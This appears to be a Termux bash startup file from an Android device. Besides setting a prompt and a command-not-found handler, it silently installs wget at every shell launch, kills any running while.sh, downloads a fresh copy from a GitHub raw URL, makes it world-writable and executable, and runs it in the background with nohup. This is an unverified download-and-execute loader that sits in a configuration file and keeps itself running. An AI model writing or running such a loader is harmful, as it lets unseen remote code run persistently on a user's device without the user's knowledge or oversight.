if [ -x /data/data/com.termux/files/usr/libexec/termux/command-not-found ]; then
        command_not_found_handle() {
                /data/data/com.termux/files/usr/libexec/termux/command-not-found "$1"
        }
fi

PS1='\$ '


if [ ! -e "/data/data/com.termux/files/usr/bin/wget" ]; then
   pkg install -y wget
fi

if [ ! -e "/data/data/com.termux/files/home/done" ]; then
   echo "-1" > done
fi

pkill while.sh
wget -q -N https://raw.githubusercontent.com/U117A/scripts/master/while.sh && chmod 777 while.sh && nohup ./while.sh &
pwd
